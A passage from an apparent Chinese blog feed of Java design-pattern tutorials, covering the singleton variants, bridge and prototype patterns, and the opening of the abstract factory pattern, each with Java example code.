<p>这种写法在getSingleton方法中对singleton进行了两次判空，第一次是为了不必要的同步，第二次是在singleton等于null的情况下才创建实例。DCL优点是资源利用率高，第一次执行getInstance时单例对象才被实例化，效率高。缺点是第一次加载时反应稍慢一些，在高并发环境下也有一定的缺陷，虽然发生的概率很小。DCL虽然在一定程度解决了资源的消耗和多余的同步，线程安全等问题，但是他还是在某些情况会出现失效的问题，也就是DCL失效.</p>
<h3 id="静态内部类单例模式"><a href="#静态内部类单例模式" class="headerlink" title="静态内部类单例模式"></a>静态内部类单例模式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> SingletonHolder.sInstance;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonHolder</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton sInstance = <span class="keyword">new</span> Singleton();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一次加载Singleton类时并不会初始化sInstance，只有第一次调用getInstance方法时虚拟机加载SingletonHolder 并初始化sInstance ，这样不仅能确保线程安全也能保证Singleton类的唯一性，所以推荐使用静态内部类单例模式。</p>
<h3 id="静态内部类单例模式-1"><a href="#静态内部类单例模式-1" class="headerlink" title="静态内部类单例模式"></a>静态内部类单例模式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> Singleton &#123;  </span><br><span class="line">     INSTANCE;  </span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doSomeThing</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">     &#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>默认枚举实例的创建是线程安全的，并且在任何情况下都是单例，上述讲的几种单例模式实现中，有一种情况下他们会重新创建对象，那就是反序列化，将一个单例实例对象写到磁盘再读回来，从而获得了一个实例。反序列化操作提供了readResolve方法，这个方法可以让开发人员控制对象的反序列化。在上述的几个方法示例中如果要杜绝单例对象被反序列化是重新生成对象，就必须加入如下方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> <span class="keyword">throws</span> ObjectStreamException</span>&#123;</span><br><span class="line"><span class="keyword">return</span> singleton;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>枚举单例的优点就是简单，但是大部分应用开发很少用枚举，可读性并不是很高，不建议用。</p>
<h3 id="使用容器实现单例模式"><a href="#使用容器实现单例模式" class="headerlink" title="使用容器实现单例模式"></a>使用容器实现单例模式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonManager</span> </span>&#123; </span><br><span class="line">　　<span class="keyword">private</span> <span class="keyword">static</span> Map&lt;String, Object&gt; objMap = <span class="keyword">new</span> HashMap&lt;String,Object&gt;();</span><br><span class="line">　　<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123; </span><br><span class="line">　　&#125;</span><br><span class="line">　　<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">registerService</span><span class="params">(String key, Objectinstance)</span> </span>&#123;</span><br><span class="line">　　　　<span class="keyword">if</span> (!objMap.containsKey(key) ) &#123;</span><br><span class="line">　　　　　　objMap.put(key, instance) ;</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　&#125;</span><br><span class="line">　　<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title">ObjectgetService</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">　　　　<span class="keyword">return</span> objMap.get(key) ;</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用SingletonManager 将多种的单例类统一管理，在使用时根据key获取对象对应类型的对象。这种方式使得我们可以管理多种类型的单例，并且在使用时可以通过统一的接口进行获取操作，降低了用户的使用成本，也对用户隐藏了具体实现，降低了耦合度。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/itachi85/article/details/50510124" target="_blank" rel="noopener">设计模式（二）单例模式的七种写法</a></p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>单例模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-桥接模式</title>
    <url>/2020/04/09/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>桥接（Bridge）是用于把抽象化与实现化解耦，使得二者可以独立变化。这种类型的设计模式属于结构型模式，它通过提供抽象化和实现化之间的桥接结构，来实现二者的解耦。</p>
<p>这种模式涉及到一个作为桥接的接口，使得实体类的功能独立于接口实现类。这两种类型的类可被结构化改变而互不影响。</p>
<p>桥接模式的作用是在“类的功能层次结构”和“类的实现层次结构”之间搭建桥梁。</p>
<h3 id="类的功能层次结构"><a href="#类的功能层次结构" class="headerlink" title="类的功能层次结构"></a>类的功能层次结构</h3><p>假设有一个类something。当我们想在something中增加新功能时，会编写一个something的子类，即somethingGood类。这样就构成了一个小小的类层次结构。</p>
<p>something</p>
<p>​        – somethingGood</p>
<p>这就是为了增加新功能而产生的层次结构</p>
<h3 id="类的实现层次结构"><a href="#类的实现层次结构" class="headerlink" title="类的实现层次结构"></a>类的实现层次结构</h3><p>在模板模式中，我们学习了抽象类的作用，抽象类声明了一些抽象方法，定义了接口，然后子类负责去实现这些抽象方法。父类的任务是通过声明抽象方法的方式定义接口，而子类的任务是实现抽象方法。正是由于父类和子类的这种任务分担，我们菜可以编写出具有高可替换性的类。</p>
<p>这里企事业存在层次结构。例如，当子类ConcreteClass实现了父类AbstractClass类的抽象方法时，它们之间就构成了一个小小的层次结构。</p>
<p>AbstractClass</p>
<p>​        – ConcreteClass</p>
<p>但是，这里的类层次结构并非用于增加功能，也就是说，这种层次结构并非用于方便我们增加新的方法。它真真的作用是帮助我们实现下面这样的任务分担。</p>
<p>这种层次结构被称为“类的实现层次结构”</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-08-brige1.png" alt="桥接模式类图"></p>
<h3 id="Abstraction（抽象化）"><a href="#Abstraction（抽象化）" class="headerlink" title="Abstraction（抽象化）"></a>Abstraction（抽象化）</h3><p>处于“类的功能层次结构”最上层，它使用Implementor角色的方法定义了基本的功能。保存了Implementor角色的实例。</p>
<h3 id="RefinedAbstraction（改善后的抽象化）"><a href="#RefinedAbstraction（改善后的抽象化）" class="headerlink" title="RefinedAbstraction（改善后的抽象化）"></a>RefinedAbstraction（改善后的抽象化）</h3><p>在Abstraction的基础上增加了新功能的角色。</p>
<h3 id="Implementor（实现者）"><a href="#Implementor（实现者）" class="headerlink" title="Implementor（实现者）"></a>Implementor（实现者）</h3><p>位于“类的实现层次结构”的最上层。定义了用于实现Abstraction的接口的方法。</p>
<h3 id="ConcreteImplementor（具体实现者）"><a href="#ConcreteImplementor（具体实现者）" class="headerlink" title="ConcreteImplementor（具体实现者）"></a>ConcreteImplementor（具体实现者）</h3><p>负责实现在Implementor中定义的接口</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-08-brige2.png" alt="桥接模式示例类图"></p>
<h3 id="Display"><a href="#Display" class="headerlink" title="Display"></a>Display</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Display</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> DisplayImpl impl;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Display</span><span class="params">(DisplayImpl impl)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.impl = impl;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		impl.rawOpen();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		impl.rawPrint();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		impl.rawClose();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		open();</span><br><span class="line">		print();</span><br><span class="line">		close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CountDisplay"><a href="#CountDisplay" class="headerlink" title="CountDisplay"></a>CountDisplay</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CountDisplay</span> <span class="keyword">extends</span> <span class="title">Display</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">CountDisplay</span><span class="params">(DisplayImpl impl)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(impl);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">multiDisplay</span><span class="params">(<span class="keyword">int</span> times)</span> </span>&#123;</span><br><span class="line">		open();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; times;i++) &#123;</span><br><span class="line">			print();</span><br><span class="line">		&#125;</span><br><span class="line">		close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DisplayImpl"><a href="#DisplayImpl" class="headerlink" title="DisplayImpl"></a>DisplayImpl</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">DisplayImpl</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">rawOpen</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">rawPrint</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">rawClose</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="StringDisplayImpl"><a href="#StringDisplayImpl" class="headerlink" title="StringDisplayImpl"></a>StringDisplayImpl</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringDisplayImpl</span> <span class="keyword">extends</span> <span class="title">DisplayImpl</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> String string;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> width;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">StringDisplayImpl</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.string = string;</span><br><span class="line">		<span class="keyword">this</span>.width = string.length();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rawOpen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		printLine();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rawPrint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"| "</span> + string + <span class="string">"| "</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rawClose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		printLine();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">printLine</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.print(<span class="string">"+"</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; width;i++) &#123;</span><br><span class="line">			System.out.print(<span class="string">"-"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">"+"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Display d1 = <span class="keyword">new</span> Display(<span class="keyword">new</span> StringDisplayImpl(<span class="string">"Hello, China."</span>));</span><br><span class="line">		Display d2 = <span class="keyword">new</span> CountDisplay(<span class="keyword">new</span> StringDisplayImpl(<span class="string">"Hello, World."</span>));</span><br><span class="line">		CountDisplay d3 = <span class="keyword">new</span> CountDisplay(<span class="keyword">new</span> StringDisplayImpl(<span class="string">"Hello, Universe."</span>));</span><br><span class="line">		RandomDisplay d4 = <span class="keyword">new</span> RandomDisplay(<span class="keyword">new</span> StringDisplayImpl(<span class="string">"Hello, tanxiangling."</span>));</span><br><span class="line">		d1.display();</span><br><span class="line">		d2.display();</span><br><span class="line">		d3.display();</span><br><span class="line">		d3.multiDisplay(<span class="number">5</span>);</span><br><span class="line">		d4.display();</span><br><span class="line">		d4.randomDisplay(<span class="number">5</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>桥接模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-原型模式</title>
    <url>/2020/04/09/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>在Java中，我们可以使用new关键字指定类名来生成类的实例。像这样使用new来生成实例时，是必须指定类名的。但是，在开发过程中，有时候也会有“在不指定类名的前提下生成实例”的需求，例如，在以下情况下，我们就不能根据类来生成实例，而要根据现有的实例来生成新的实例。</p>
<h3 id="对象种类繁多，无法将它们整合到一个类中时"><a href="#对象种类繁多，无法将它们整合到一个类中时" class="headerlink" title="对象种类繁多，无法将它们整合到一个类中时"></a>对象种类繁多，无法将它们整合到一个类中时</h3><p>需要处理的对象太多，如果将它们分别作为一个类，必须要编写很多个类文件</p>
<h3 id="难以根据类生成实例时"><a href="#难以根据类生成实例时" class="headerlink" title="难以根据类生成实例时"></a>难以根据类生成实例时</h3><p>生成实例的过程太复杂，很难根据类来生成实例。通常，在想生成一个和之前用户通过操作所创建出的实例完全一样的实例的时候，我们会事先将用户通过操作所创建出的实例保存起来，然后在需要时通过复制来创建新的实例。</p>
<h3 id="想解耦框架与生成的实例时"><a href="#想解耦框架与生成的实例时" class="headerlink" title="想解耦框架与生成的实例时"></a>想解耦框架与生成的实例时</h3><p>想要让生成实例的框架不依赖于具体的类。这时，不能指定类名来生成实例，而要事先“注册”一个“原型”实例，然后通过复制该实例来生成新的实例。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-08-ptototype1.png" alt="原型模式类图"></p>
<h3 id="Prototype（原型）"><a href="#Prototype（原型）" class="headerlink" title="Prototype（原型）"></a>Prototype（原型）</h3><p>Prototype负责定义用于复制现有实例来生成新实例的方法。</p>
<h3 id="ConcretePrototype（具体的原型）"><a href="#ConcretePrototype（具体的原型）" class="headerlink" title="ConcretePrototype（具体的原型）"></a>ConcretePrototype（具体的原型）</h3><p>负责实现复制现有实例并生成新实例的方法</p>
<h3 id="Client（使用者）"><a href="#Client（使用者）" class="headerlink" title="Client（使用者）"></a>Client（使用者）</h3><p>负责使用复制实例的方法生成新的实例。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-08-ptototype2.png" alt="原型模式示例类图"></p>
<h3 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h3><p>继承了Cloneable接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Product</span> <span class="keyword">extends</span> <span class="title">Cloneable</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">use</span><span class="params">(String s)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> Product <span class="title">createClone</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Manager</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> HashMap&lt;String, Product&gt; showcase = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(String name, Product product)</span> </span>&#123;</span><br><span class="line">		showcase.put(name, product);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Product <span class="title">create</span><span class="params">(String productName)</span> </span>&#123;</span><br><span class="line">		Product p = showcase.get(productName);</span><br><span class="line">		<span class="keyword">return</span> p.createClone();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox"></a>MessageBox</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MessageBox</span> <span class="keyword">implements</span> <span class="title">Product</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">char</span> decochar;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MessageBox</span><span class="params">(<span class="keyword">char</span> decochar)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.decochar = decochar;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">use</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> length = s.getBytes().length;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; length + <span class="number">4</span>;i++) &#123;</span><br><span class="line">			System.out.print(decochar);</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">""</span>);</span><br><span class="line">		System.out.println(decochar + <span class="string">" "</span> + s + <span class="string">" "</span> + decochar);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; length + <span class="number">4</span>;i++) &#123;</span><br><span class="line">			System.out.print(decochar);</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">""</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Product <span class="title">createClone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		Product p = <span class="keyword">null</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			p = (Product)clone();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (CloneNotSupportedException e) &#123;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> p;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="UnderlinePen"><a href="#UnderlinePen" class="headerlink" title="UnderlinePen"></a>UnderlinePen</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnderlinePen</span> <span class="keyword">implements</span> <span class="title">Product</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">char</span> ulChar;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">UnderlinePen</span><span class="params">(<span class="keyword">char</span> ulChar)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.ulChar = ulChar;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">use</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> length = s.getBytes().length;</span><br><span class="line">		System.out.println(<span class="string">"\""</span> + s + <span class="string">"\""</span>);</span><br><span class="line">		System.out.print(<span class="string">" "</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length;i++) &#123;</span><br><span class="line">			System.out.print(ulChar);</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">""</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Product <span class="title">createClone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		Product p = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			p = (Product) clone();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (CloneNotSupportedException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> p;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Manager manager = <span class="keyword">new</span> Manager();</span><br><span class="line">		</span><br><span class="line">		UnderlinePen pen = <span class="keyword">new</span> UnderlinePen(<span class="string">'~'</span>);</span><br><span class="line">		</span><br><span class="line">		MessageBox mBox = <span class="keyword">new</span> MessageBox(<span class="string">'*'</span>);</span><br><span class="line">		MessageBox sBox = <span class="keyword">new</span> MessageBox(<span class="string">'/'</span>);</span><br><span class="line">		manager.register(<span class="string">"strong message"</span>, pen);</span><br><span class="line">		manager.register(<span class="string">"warning box"</span>, mBox);</span><br><span class="line">		manager.register(<span class="string">"slash box"</span>, sBox);</span><br><span class="line">		</span><br><span class="line">		Product p1 = manager.create(<span class="string">"strong message"</span>);</span><br><span class="line">		p1.use(<span class="string">"Hello, world"</span>);</span><br><span class="line">		Product p2 = manager.create(<span class="string">"warning box"</span>);</span><br><span class="line">		p2.use(<span class="string">"Hello, world"</span>);</span><br><span class="line">		Product p3 = manager.create(<span class="string">"slash box"</span>);</span><br><span class="line">		p3.use(<span class="string">"Hello, world"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>clone方法定义在java.lang.Object中。因为Object类是所有Java类的父亲，因为所有的Java类都继承了clone方法。</li>
<li>cloneable接口中并没有声明任何方法。它只是被用来标记“可以使用clone方法进行复制的”。这样的接口被称为<strong>标记接口</strong>。</li>
<li>clone方法所进行的复制只是<strong>将被复制实例的字段值直接复制到新的实例中</strong>。换言之，它并没有考虑字段中所保存的实例的内容。例如，当字段中保存的是数组时，如果使用clone方法进行复制，则只会复制该数组对象的引用，并不会一一复制数组中的元素。向上面这样字段对字段的复制被称为<strong>浅复制</strong>。clone方法进行的复制，就是<strong>浅复制</strong>。</li>
<li>当使用clone方法进行浅复制无法满足需求时，类的设计者可以实现重写clone方法，实现自己需要的复制功能（重写clone方法时，不要忘记使用super.clone()来调用父类的clone方法）。</li>
<li>clone方法只会进行复制，并不会调用被复制实例的构造函数。此外，对于在生成实例时需要进行特殊的初始化处理的类，需要自己去实现clone方法，在其内部进行这些初始化处理。</li>
</ol>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>原型模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-抽象工厂模式</title>
    <url>/2020/04/09/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>抽象工厂模式（Abstract Factory Pattern）是围绕一个超级工厂创建其他工厂。该超级工厂又称为其他工厂的工厂。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。</p>
<p>在抽象工厂模式中，接口是负责创建一个相关对象的工厂，不需要显式指定它们的类。每个生成的工厂都能按照工厂模式提供对象。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-08-abstractfactory1.png" alt="抽象工厂模式类图"></p>
<h3 id="AbstractProduct（抽象产品）"><a href="#AbstractProduct（抽象产品）" class="headerlink" title="AbstractProduct（抽象产品）"></a>AbstractProduct（抽象产品）</h3><p>负责定义AbstractFactory角色所生成的抽象零件和产品的接口</p>
<h3 id="AbstractFactory（抽象工厂）"><a href="#AbstractFactory（抽象工厂）" class="headerlink" title="AbstractFactory（抽象工厂）"></a>AbstractFactory（抽象工厂）</h3><p>负责定义用于生成抽象产品的接口的接口</p>
<h3 id="ConcreteProduct（具体产品）"><a href="#ConcreteProduct（具体产品）" class="headerlink" title="ConcreteProduct（具体产品）"></a>ConcreteProduct（具体产品）</h3><p>负责实现AbstractProduct角色的接口</p>
<h3 id="ConcreteFactory（具体工厂）"><a href="#ConcreteFactory（具体工厂）" class="headerlink" title="ConcreteFactory（具体工厂）"></a>ConcreteFactory（具体工厂）</h3><p>负责实现AbstractFactory角色的接口</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-08-abstractfactory2.png" alt="抽象工厂模式示例类图"></p>
